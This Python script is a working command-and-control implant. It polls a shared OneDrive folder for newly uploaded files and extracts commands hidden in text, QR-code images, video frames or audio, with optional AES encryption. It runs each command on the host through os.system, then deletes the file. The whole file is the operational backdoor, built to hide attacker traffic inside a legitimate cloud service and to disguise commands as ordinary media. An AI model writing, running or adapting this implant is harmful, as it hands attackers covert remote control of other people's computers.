import urllib.parse as urlparse
import read_file
import requests
import datetime
import config
import json
import time
import os

debug = config.debug

def parse_vals(url):
	redir_url = requests.get(url, allow_redirects=True).url
	parsed = urlparse.urlparse(redir_url)
	params = urlparse.parse_qs(parsed.query)
	folder_id = params['resid'][0].split("!")[0]
	first_item_id = params['resid'][0].split("!")[1]
	authkey = params['authkey'][0]
	return folder_id, first_item_id, authkey


def get_next_id(folder_id, first_item_id, authkey):
	max_files_to_check = 30
	for i in range(1,max_files_to_check):
		item_id = str(int(first_item_id)+i)
		folder_item_id = folder_id+"!"+item_id
		s_url = "https://api.onedrive.com/v1.0/drives/"+folder_id+"/items/"+folder_item_id+"?select=id%2C%40content.downloadUrl&authkey="+authkey
		json_file_data = json.loads(requests.get(s_url).content)
		if "error" not in json_file_data:
			file_url = json_file_data['@content.downloadUrl']
			if debug: print("[+] File with id %s download url: %s"%(item_id, file_url))
		else:
			next_id = str(int(first_item_id)+i)
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] It does not exist the item with id %s"%(now.hour,now.minute,now.second,str(next_id)))
			return next_id


def download_file(file_url, downloaded_file_path):
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] New file! Downloading to: %s"%(now.hour,now.minute,now.second,downloaded_file_path))
	with requests.get(file_url, stream=True) as r:
		r.raise_for_status()
		with open(downloaded_file_path, 'wb') as f:
			for chunk in r.iter_content(chunk_size=8192): 
				f.write(chunk)


def analyze(downloaded_file, temp_folder):
	data_type = config.data_type
	commands = []
	if data_type == "text" or data_type == "text_encrypted":
		if not downloaded_file.endswith(".txt"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".txt"))
		else:
			commands = read_file.read_text(data_type, downloaded_file)
	elif data_type == "image" or data_type == "image_encrypted":
		if not downloaded_file.endswith(".png"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".png"))
		else:
			if data_type == "image":
				commands = read_file.read_image("qr", downloaded_file)
			elif data_type == "image_encrypted":
				commands = read_file.read_image("qr_aes", downloaded_file)
	elif data_type == "video" or data_type == "video_encrypted":
		if not downloaded_file.endswith(".avi"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".avi"))
		else:
			if data_type == "video":
				commands = read_file.read_video("qr", downloaded_file, temp_folder)
			elif data_type == "video_encrypted":
				commands = read_file.read_video("qr_aes", downloaded_file, temp_folder)
	elif data_type == "audio" or data_type == "audio_encrypted":
		if not downloaded_file.endswith(".wav"):
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Incorrect extension. Expected: %s"%(now.hour,now.minute,now.second,".wav"))
		else:
			commands = read_file.read_audio(data_type, downloaded_file)
	else:
		if debug: print("[%02d:%02d:%02d] Unexpected data_type value: %s"%(now.hour,now.minute,now.second,data_type))
	return commands


def execute_commands(commands):
	for cmd_ in commands:
		now = datetime.datetime.now()
		if debug: print("[%02d:%02d:%02d] Command: %s"%(now.hour,now.minute,now.second,cmd_))
		os.system(cmd_)


def wait_for_upload(folder_id, next_id, authkey, temp_folder):
	delay_seconds = config.delay_seconds
	data_type = config.data_type
	if data_type == "text" or data_type == "text_encrypted":
		downloaded_file = temp_folder + "/test.txt"
	elif data_type == "image" or data_type == "image_encrypted":
		downloaded_file = temp_folder + "/test.png"
	elif data_type == "video" or data_type == "video_encrypted":
		downloaded_file = temp_folder + "/test.avi"
	elif data_type == "audio" or data_type == "audio_encrypted":
		downloaded_file = temp_folder + "/test.wav"
	now = datetime.datetime.now()
	if debug: print("[%02d:%02d:%02d] Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
	while True:
		time.sleep(delay_seconds)
		folder_item_id = folder_id+"!"+next_id
		s_url = "https://api.onedrive.com/v1.0/drives/"+folder_id+"/items/"+folder_item_id+"?select=id%2C%40content.downloadUrl&authkey="+authkey
		if debug: print("[%02d:%02d:%02d] Checking url: %s"%(now.hour,now.minute,now.second,s_url))
		json_file_data = json.loads(requests.get(s_url).content)
		if "error" not in json_file_data:	
			file_url = json_file_data['@content.downloadUrl']
			download_file(file_url, downloaded_file)
			commands = analyze(downloaded_file, temp_folder)
			execute_commands(commands)
			next_id = str(int(next_id)+1)
			os.remove(downloaded_file)
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))
		else:
			now = datetime.datetime.now()
			if debug: print("[%02d:%02d:%02d] No new file uploaded. Waiting %s seconds..."%(now.hour,now.minute,now.second,delay_seconds))


def main():
	temp_folder = "."
	url = config.onedrive_folder
	folder_id, first_item_id, authkey = parse_vals(url)
	next_id = get_next_id(folder_id, first_item_id, authkey)
	wait_for_upload(folder_id, next_id, authkey, temp_folder)


if __name__== "__main__":
	main()